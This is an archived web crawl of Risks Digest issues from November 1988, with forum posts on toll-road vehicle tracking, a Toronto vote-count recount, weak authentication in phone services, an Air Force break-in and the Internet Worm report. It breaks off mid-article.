shows...  They start with the Big Picture, but they don't stop with "but now it
gets so complex you couldn't possibly understand it" -- they go on to explain
in some technical detail.

So here's what they said: The "black box" is welded to the frame of your
car, and is virtually indestructable.  It has no external features.  It
has no power source (!).  If the handshake fails, a camera snaps a
picture of car, driver(?), and traditional number plate. 

The system they showed had 10 (?) nodes in central Hong Kong (or some
other high-density Asian city).  There are still a few bugs to work out
of the system, which RISKS readers have been quick to point out. 

No power source? I guess part of the inquiry from the roadbed is energy
enough for it to transmit back.

Towards 2000 and Beyond 2000 are on The Discovery Channel, which cable
services sometimes have as part of the basic service. 

Opinions expressed above do not necessarily	-- Allan Pratt, Atari Corp.
reflect those of Atari Corp. or anyone else.	  ...ames!atari!apratt

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: UK vehicle-identification systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:att!ihlpl!jhh@ucbvax.Berkeley.EDU">
att!ihlpl!jhh@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Mon, 21 Nov 88 08:03:05 PST
</i><PRE>

denbeste@OAKLAND.BBN.COM writes:
&gt;I find Chaz's description of the new system in Britain for toll-roads very
&gt;interesting, to say the least. I have some interesting questions:

&gt;1. As I understood it, what we have is a radio handshake between each car and
&gt;fixed transceivers at the entrance and exit from the toll-road, presumably
&gt;connected to a computer billing system which mails you a bill each month. What
&gt;if you move and don't tell the computer your new address?

The Illinois Toll Authority has already installed this automated toll
collecting equipment on one exit as a trial.  They are retaining the coin
collection equipment, but are also supplying several large users, such as
limousine services and trucking companies, who use this exit with equipment
that will allow the users to be billed directly.  The device can read the
identification of vehicles traveling at up to 35 MPH [56 km/hr].  Since the
coin collection boxes are located on a curve here, the speed limit should pose
no problems.  In case you are from the Chicago area, this equipment is located
at the Farnsworth exit off of the East-West Tollway, I-88, formerly IL-5.
Unfortunately, there was no information readily available to describe the
transceiver.

The Illinois Toll System does not use entry/exit tolls, but rather periodic
toll barriers.  This causes large backups during rush hour, as everyone has to
put in their $0.40.  The hope is that this system will reduce congestion, and
that the expense of adding more toll booths can be avoided.

John Haller  jhh@ihlpl.att.com

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.80.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.82.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-34</DOCNO>
<DOCOLDNO>IA012-000131-B035-216</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.82.html 128.240.150.127 19970217024015 text/html 24007
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:38:43 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 82</TITLE>
<LINK REL="Prev" HREF="/Risks/7.81.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.83.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.81.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.83.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 82</H1>
<H2> Wednesday 23 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Troubles with automatic vote counting in Toronto 
</A>
<DD>
<A HREF="#subj1.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of remote registration 
</A>
<DD>
<A HREF="#subj2.1">
anonymous
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The risks of using CACM inserts 
</A>
<DD>
<A HREF="#subj3.1">
Eric Hughes
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer Breakin article [San Antonio] 
</A>
<DD>
<A HREF="#subj4.1">
Maj. Doug Hardie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Ethics and Software 
</A>
<DD>
<A HREF="#subj5.1">
Brian Kahin via Ezra Zubrow and Bruce O'Neel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Teaching Children Ethics 
</A>
<DD>
<A HREF="#subj6.1">
Homer W. Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: toll road speed checking 
</A>
<DD>
<A HREF="#subj7.1">
Brent Laminack
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Privacy vs UK vehicle-identification systems 
</A>
<DD>
<A HREF="#subj8.1">
Andrew Klossner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  RightTouch service 
</A>
<DD>
<A HREF="#subj9.1">
Scott C. Crumpton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Cordless Telephones 
</A>
<DD>
<A HREF="#subj10.1">
Walker
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Troubles with automatic vote counting in Toronto
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Tue, 22 Nov 88 15:00:59 EST
</i><PRE>

[Background:  In Canada, voting in all levels of election has been done by the
voter pencilling an X on a paper ballot, which is then counted by hand.
Municipal elections are normally the only ones where multiple offices are voted
on at once, with several X's on the ballot.

In Ontario, all municipal elections are synchronized and they were held last
week.  For the first time, the elections in Toronto used an auto- matic
technique.  The voter had to blacken a circle to vote for a candidate;
obviously optical mark recognition.]

Toronto Star, November 22, 1983:
Toronto is going to make doubly sure that a recount of last Monday's
municipal election ballots is correct.  At an emergency meeting of the
outgoing city council yesterday, politicians ordered staff to recount all
142,107 ballots by hand as well as by automatic voting machine -- an
arduous task that could take several days.

Although provincial law only recognizes the machine count, councillors said
the unofficial manual recount will [!] help to restore confidence in the
city's new $1.6 million automated system.

The recount was recommended by City Clerk Roy Henderson last week after his
staff discovered that a record 1,408 ballots were rejected by the city's
new automated voting machines.  The machines are programmed to reject
spoiled ballots, but Henderson says he finds "it hard to believe that
there were 1,408 spoiled ballots".

Because the rejected ballots were not singled out when they were initially
fed through the machines [sigh!] on Monday, a recount is needed to find
the rejected ballots and examine them, he told council.

Henderson said he believes that the high number of rejected or "unread"
ballots was not the fault of the machines, but due to a cutting error on
the ballots.  Staff ran some ballots through the machine as a test last
week and found that some ballots were not cut properly, but correctly
filled out, were rejected, he told council.

"Any variance of 25 thousandths of an inch would cause the machine to reject a
ballot", he said, quoting information from the Business Records Corporation,
the American company that supplies the city's voting machines and ballots.

The only race in Toronto that could be affected and which wasn't already
so close that recounts had already been called is the contest for public
school board trustee in Wards 9 and 10.  Sandra Bussin beat Anne Ferguson
by 217 votes, but the number of "unread" ballots in those wards was 238.

... Some alderman questioned why the city should do a full recount of all
the wards if the outcome of the election won't be changed and staff already
know what caused the error.

"The electorate has to be confident that the vote tabulation machines do the
job they are supposed to do", city solicitor Dennis Perlin replied.

[There were no such reports of problems from other municipalities in
Metropolitan Toronto which also used the voting machines.]

Mark Brader, Toronto		utzoo!sq!msb, msb@sq.com

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks of remote registration
</A>
</H3>
<address>

&lt;<A HREF="mailto:anonymous contributor">
anonymous contributor
</A>&gt;
</address>
<i>
Mon, 21 Nov 88 21:44:24 PST
</i><PRE>

"Touchtone registration" is what many universities are going to, including the
one I work for.  This allows students to register, drop, and add classes from
the comfort of any available touchtone phone.  (There are some on campus for
students that don't have access to one normally.)  Unlike the previous early
registration system, it allows students to choose their own alternatives when
classes are filled or are not allowed.  (class full, conflicting times, not
authorized, etc.)

What worries me is the choice of 9 digit student ID (one will be assigned in
the 900 range for students not supplying their SSN) and 6 digit access code
(the student's birthday).  With this information about any student, it is
possible to rearange their schedule.  (Confirmation of the change is sent in
the mail, assuming that your address is up to date.) Pranks (register someone
for "human sexuality") and dropping someone from a full class so you can get in
are possible abuses, as is changing your mind about a schedule rearrangement
then complaining that you didn't do it.

  [Supposedly, ethically minded students would not entertain such pranks?  
  But, historically, pranks abound among college kids.  On the other hand,
  designing a system to prevent such malicious misuse is not easy.  Note
  that audit trails would not help much, because the record will say that
  the victim was the person who authorized the change!  A written notification
  might help, with some period allowed for appeals that it was not legitimate,
  but that too could be abused intentionally -- e.g., to give you a deferred
  option...  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Computer Breakin article
</A>
</H3>
<address>
"Maj. Doug Hardie" 
&lt;<A HREF="mailto:Hardie@DOCKMASTER.ARPA">
Hardie@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 23 Nov 88 13:56 EST
</i><PRE>

The following is taken from Intercom, Vol 28, No 24, Nov, 11, 1988, an
Air Force Communications Command newsletter:

Computer break-in

By Special Agent Mike Forche, AFOSI computer crime investigator

  A computer hacker penetrated an Air Force Sperry 1160 computer
system in the San Antonio, Texas, area.  The hacker was discovered by
alert Air Force Communications Command computer operators who notified
the data base administrator than an un-authorized user was in the
system.  The data base administrator was able to identify the
terminal, password, and USERID (system level) used by the hacker.

  The data base administrator quickly disabled the USERID/password
(which belonged to a computer system monitor).  The data base
administrator then observed the hacker trying to get into the system
using the old USERID/password.  He watched as the hacker successfully
gained entry into the system using another unauthorized
USERID/password (which was also a system administrator level password).

  The hacker was an authorized common user in the computer system;
however, he obtained system administrator access level to the
government computer on both occasions.

  Review of the audit trail showed that the hacker had successfully
gained unauthorized access to the computer every day during the two
weeks the audit was run.  In addition, the hacker got unauthorized
access to a pay file and instructed the computer floor operator to
load a specific magnetic tape (pay tape).

  The hacker was investigated by Air Force Office of Special
Investigation computer crime investigators for violation of federal
crimes (Title 18 US Codes 1030 computer fraud, and 641 wrongful
conversion of government property), Texas state crimes (Title 7,
Section 33.02 Texas computer crime wrongful access) and military
crimes (obtaining services under false pretense, Uniform Code of
Military Justice, Article 134).

  The computer crime investigators made the following observations:

  - USERIDs used by the hacker were the same ones he used at his last
base when he had authorized system access in his job.  The use of
acronyms and abbreviations of job titles will hardly fool anyone; plus
the use of standard USERID base to base is dangerous.

  - The passwords the hacker used were the first names of the monitors
who owned the USERIDs.  The use of names, phone numbers, and other
common easily-guessed items have time and time again been beaten by
even the unsophisticated hackers.
 
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 The risks of using CACM inserts
</A>
</H3>
<address>
&lt;<A HREF="mailto:hughes%math.Berkeley.EDU@cartan.berkeley.edu">
hughes%math.Berkeley.EDU@cartan.berkeley.edu
</A>&gt;
</address>
<i>
Tue, 22 Nov 88 22:05:29 PST
</i><PRE>

In the November 1988 issue of CACM, at page A-17 there is a tear-out
postcard for ordering ACM Press book.  On the back of the postcard
there is a blank for one's credit card number and expiration date.

Yes, on a postcard.

Eric Hughes      hughes@math.berkeley.edu     ucbvax!math!hughes

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     ETHICS AND SOFTWARE
</A>
</H3>
<address>
        Ezra Zubrow 
&lt;<A HREF="mailto:APYEZRA@UBVMS">
APYEZRA@UBVMS
</A>&gt;
</address>
<i>
Mon, 21 Nov 88 16:46:00 EST
</i><PRE>
Forwarded-By:  BRUCE O'NEEL &lt;XRBEO@SCFVM&gt;

From: IN%"KAHIN@hulaw1.HARVARD.EDU"  "Brian Kahin 617-864-6606" 18-NOV-1988 
17 : 5 3

Return-path: info-law-request@sem.brl.MIL
Date: Tue, 15 Nov 88 16:36 EST
From: Brian Kahin 617-864-6606 &lt;KAHIN@hulaw1.HARVARD.EDU&gt;
Subject: EDUCOM white paper

Readers of this list may be interested in the white paper, "Property and
Propriety in the Digital Environment: Towards an Examination Copy License,"
just published by the EDUCOM Software Initiative.  The paper, which I prepared
for ESI, proposes to two model licenses to encourage faculty evaluation of
software programs while maintaining respect for the rights of copyright owners.

The first model license is for "circulating evaluation copies" -- i.e. copies
which can be circulated by libraries or other campus facilities.  It is
targeted to commercial publishers of tools and courseware.

The second model license is for "distributable evaluation copies" -- copies
which may be downloaded or duplicated subject to certain conditions.  In
effect, it proposes a standard for "academic shareware" that is more rigorous
than conventional shareware licenses.  It addresses the differences among
shareware licenses by offering a kind of lowest common denominator.  It is
hoped that the model license -- and the kind of user environment that the
EDUCOM Software Initiative is trying to foster -- will encourage academic
authors to disseminate evaluation versions of their software over the academic
networks.

The white paper will appear in the next issue of the EDUCOM Bulletin.  A
specially published version is available on request from the EDUCOM Software
Initiative:

EDUCOM Software Initiative, PO Box 364, Princeton, NJ  08540  609-520-3340
BITNET: esi@educom

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Teaching Children Ethics
</A>
</H3>
<address>
   "Homer W. Smith" 
&lt;<A HREF="mailto:CTM@CORNELLC.ccs.cornell.edu">
CTM@CORNELLC.ccs.cornell.edu
</A>&gt;
</address>
<i>
Mon, 21 Nov 88 23:05:40 EST
</i><PRE>

     There is much apathy about teaching ethics to our children.
Some have suggested this is because the ethics that is being taught
is really only in the self interest of the teacher at the
expense of the child.  'It is your DUTY to die for your country
whenever the government calls', etc.

     Others have suggested it is because religions of various sort
have given it a bad name by making ethics some sort of absolute code
of behavior independant of any external circumstances.  If you are married
and there is an atomic war and you and someone else who is NOT your wife
are the only two people left alive, is it immoral to have sex with them
to restart the human race even if there is no preacher to marry you?

     Maybe there is something to be said for these ideas that years
of misuse of teaching ethics for ulterior motives has given it a bad
taste in everyones mouth, but it seems to me that there is still away
to revitalize the subject as long as we leave the religious fanactics and
the parents telling their kids its unethical to talk back out of the
picture.
     One of the most effective ways of teaching new drivers to slow
down and drive carefully is to show them movies of mangled corpses
from accidents.  Sometimes movies are not enough.  After having seen
a few real cars that had been wrapped around a telephone pole, I got
a message through to my brain about something or other that I will
never forget.  Cars are fragile and should be driven with care.

     Maybe by indoctrinating kids with the RESULTS of unethical
behavior in its goriest details and letting THEM decide and vote on
how it came about and what was unethical and how to avoid it, we will
form young adults who are capable of determining ethics for themselves
from the data of the consequences.  Show them the consequences and let
them figure it out, rather than tell them the answer (what is and is not
ethical) and hope they never have to see the consequences.
     How many kids develope sexual tragedies (pregnancy, disease etc.)
because their well meaning (?!) parents never talked to them about sex
for fear they would HAVE sex if they knew about it.  Are we not ALL
suffering from this kind of mentality in America today?
     Christ, kids don't WANT to hurt.  Don't you think we can solve the
teaching problem just as we have solved so many others?   Some would
tell you that people are bascially bad, certainly seems this way sometimes.
Maybe people look into their own hearts and they see THEY are basically bad
so they teach that others are also.  But maybe this is all wrong.
Maybe people are basically GOOD.  Even bad people.  Maybe something
went wrong.  Maybe it is up to us to figure it out and do it right.

     The solution to apathy is to realize that there IS a problem,
and there IS an answer, and WE WILL find it.  You just keep going
until you do.  The only other answer is to lock everyone up at birth.

Homer W. Smith
Senior Programmer
Hubbard Fractal Research Facility
Cornell National Supercomputer Facility

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: toll road speed checking
</A>
</H3>
<address>
Brent
&lt;<A HREF="mailto:brent@itm.UUCP ">
brent@itm.UUCP 
</A>&gt;
</address>
<i>
22 Nov 88 14:05:48 GMT
</i><PRE>

    Pennsylvania has been using entry-exit tolls on the Penn
Turnpike for a good many years now.  One of the main problems
they ran into when they first cut over about a decade ago hasn't
been mentioned here yet:  Unsynchronized clocks.  That's right.
There was no "master clock" for all the toll booths.  The problems
are obvious.  On short trips you found yourself exiting *before*
you got on (does this mean they pay YOU a toll?) or on medium-length
trips, it was common to average somewhere over 400 miles per hour 
between two certain booths.  This was during the era of mechanical
clocks, but such problems could easily carry over to the electronic age.

   brent laminack (gatech!itm!brent), In Touch Ministries, Atlanta, GA

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Privacy vs UK vehicle-identification systems
</A>
</H3>
<address>
Andrew Klossner 
&lt;<A HREF="mailto:andrew@frip.gwd.tek.com">
andrew@frip.gwd.tek.com
</A>&gt;
</address>
<i>
22 Nov 88 16:46:36 GMT
</i><PRE>

	"Why not make use of such a system voluntary? ... The principle
	seems to me to be that if you are potentially diminishing
	someone's privacy, they should have a choice about it, and the
	costs and benefits should be made clear."

In the proposed scheme, people who desire privacy must single
themselves out by entering the queue of those who want privacy.  This
alone diminishes their privacy.

It's similar to a (fanciful) scheme in which voters can choose the
"express, no privacy" line, where others can see their choices, or can
select a standard voting booth.  Those who choose to vote in privacy
may be stigmatized as those who have "something to hide."

Andrew Klossner, Tektronix, Wilsonville, Oregon 
(uunet!tektronix!hammer!frip!andrew)    [UUCP]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 RightTouch service
</A>
</H3>
<address>
Scott C. Crumpton
&lt;<A HREF="mailto:NESCC@NERVM.NERDC.UFL.EDU ">
NESCC@NERVM.NERDC.UFL.EDU 
</A>&gt;
</address>
<i>
Wed, 23 Nov 1988 09:12:05 LCL
</i><PRE>

The following blurb along with a flyer appeared in my phone bill
yesterday (Upper/lower case added by me):

       Suspend, restore and disconnect with RightTouch(SM) service

   You can suspend, restore or disconnect your Florida home telephone
   service at your convenience with Southern Bell's RightTouch
   service.  You can use RightTouch service 24 hours a day, seven days
   a week by dialing 1 800 826-6290 from a touch-tone telephone.
   There is no additional charge for using the service, although the
   normal charge for restoring your phone service still applies.

   To access RightTouch service, you will need the personal access
   code (PAC) shown below.  This code has been assigned to your
   telephone number and should be protected as you would a credit
   card.

                   ***Personal access code xxxx***

   Once you dial the RightTouch service number, easy-to-follow verbal
   instructions will guide you through the ordering processing to
   suspend, restore or disconnect your phone service.


Yet another 'service' I can do without, but there's a positive
side to this one.  It's currently possible to initiate some types
phone company service orders via a simple verbal phone call.  No
significant attempt is made to identify that the caller is who they
claim to be.  If RightTouch eventually *replaces* that process then it
may actually be an improvement.  It depends on how well it handles
repeated invalid password attempts.   ---Scott.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Cordless Telephones
</A>
</H3>
<address>
&lt;<A HREF="mailto:walker@ficc.UUCP">
walker@ficc.UUCP
</A>&gt;
</address>
<i>
Mon Nov 21 14:28:06 1988
</i><PRE>

Last week I purchased and installed a cordless telephone.  It is
marketed as the "Freedom Phone" by Southwestern Bell (the local AT&amp;T
spinoff).  After one phone conversation, I noticed that, for a very 
brief interval, I could hear what sounded like another conversation.
I've experienced cross-talk on long-distance calls, but this was a
local call.  Anyway, I suspected that I was hearing another cordless
telephone.

To verify this, I unplugged the base unit (to kill its carrier signal),
and, by golly, I could hear *both ends* of on of my neighbor's phone
conversations (I recognized my neighbor's voice!)  I checked the
manual to see what to do about this - after all, if I can hear my
neighbor, couldn't he hear me?  The "Freedom Phone" transceiver uses
any one of 10 channels in the 46-49 MHz range, selectable by an
internal rotary switch.  Well, I switched the handset to each of the 10
possible channels, and could hear conversations on EVERY CHANNEL!

The unit has a 9-bit "security" DIP-switch, but this seems to only
prevent another handset on the same frequency from accessing my base
unit.

The unit advertises a range of 1000 ft., and I'm sure that range is for
usable access of the base unit.  Actual audible signal range appears to
be MUCH farther.

When actually using the phone properly, with the handset in close
proximity to the base unit, the relative signal strength of the units
is much stronger than a neighbor's more distant unit, so you are
normally unaware of a neighbor on the same channel.  However, when
using the cordless phone, I now always consider that others may be
listening!

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.81.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.83.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-35</DOCNO>
<DOCOLDNO>IA012-000131-B035-234</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.83.html 128.240.150.127 19970217024053 text/html 15427
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:39:20 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 83</TITLE>
<LINK REL="Prev" HREF="/Risks/7.82.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.84.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.82.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.84.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 83</H1>
<H2> Monday 28 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Tech Report on the Internet Worm 
</A>
<DD>
<A HREF="#subj1.1">
Gene Spafford
</A><br>
<A HREF="#subj1.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Congress plans hearings on the Internet Worm 
</A>
<DD>
<A HREF="#subj2.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer Literacy #3 
</A>
<DD>
<A HREF="#subj3.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  More on misuses of computers 
</A>
<DD>
<A HREF="#subj4.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Chain letters = next net disaster ? 
</A>
<DD>
<A HREF="#subj5.1">
Ira Baxter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computerized Parking Meters 
</A>
<DD>
<A HREF="#subj6.1">
James Peterson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Data verification 
</A>
<DD>
<A HREF="#subj7.1">
Rob Gross
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Tech Report on the Internet Worm
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 19:53:07 EST
</i><PRE>
Organization: SERC, Department of Computer Sciences, Purdue Univ.

My tech report on the Internet Worm is finally finished! You can get a
compressed PostScript version of the formatted report via FTP as follows:

1) ftp to arthur.cs.purdue.edu         (128.10.2.1)
2) login for anonymous ftp             
3) set binary mode on
4) cd pub/reports
5) get TR823.PS.Z
6) quit

Then uncompress the file and print it.  

   [If you cannot uncompress it, you may access the UNCOMPRESSED PostScript
   file directly (280,827 bytes, by the way!):
      OMIT 3) above; it should also work in binary mode, but more slowly;
      REPLACE 5) above with "get TR823.PS", using the name of the
                                 uncompressed PS file.  Also, use a
                                 copying machine if someone you know has
                                 already FTPed it.  Spare the Internet.  PGN]

If you have already ordered a paper copy of the report and you can FTP a copy
to print it yourself, please send me mail and cancel your request for a paper
copy.

If you cannot FTP a copy and you have already ordered a paper copy, have
patience.  As soon as they get printed they will be mailed -- before the end of
this week, I am told.

If you cannot FTP a copy and would like to order a paper copy, send me your
surface mail address and I will add your name to the list.

Cheers,
--spaf

</PRE>
<HR><H3><A NAME="subj1.2">
Tech report on the Internet Worm
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:Neumann@csl.sri.com">
Neumann@csl.sri.com
</A>&gt;
</address>
<i>
28 Nov 1988 18:59:19-PST
</i><PRE>

Spaf's ``The Internet Worm Program: An Analysis'' is an extremely thoughtful
and comprehensive report.  It will be standard reading for years.  It is
offered by Spaf ``solely for the purposes of instruction and research'' (as
he states in his title-page copyright notice), and is cited in RISKS for
precisely those purposes.  There are many lessons to be learned -- including
needs for better operating systems and network protocols, better quality
programmers with greater social awareness, better ethical teaching, better
laws, and generally better understanding of THE RISKS.  Our thanks to Spaf
for his considerable contribution.  PGN

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Congress plans hearings on the Internet Worm
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 09:35:59 PST
</i><PRE>

The House Science, Space and Technology Committee and the House Judiciary
Committee are planning hearings on the Internet virus for the upcoming 101st
Congress.

Also, the author of the federal computer crime law says that he believes the 
virus programmer could be prosecuted under that law.  Here is the source,
from a story that appeared in THE SEATTLE TIMES, Sunday Nov 27 1988, p. B2:

CONGRESSMEN PLAN HEARINGS ON VIRUS - Newhouse news service

WASHINGTON - The computer virus that raced through a Pentagon data network
earlier this month is drawing the scrutiny of two congressional committee
chairmen who say they plan hearings on the issue during the 101st Congress.
  Democratic Reps. Robert Roe, chairman of the House Science Space and 
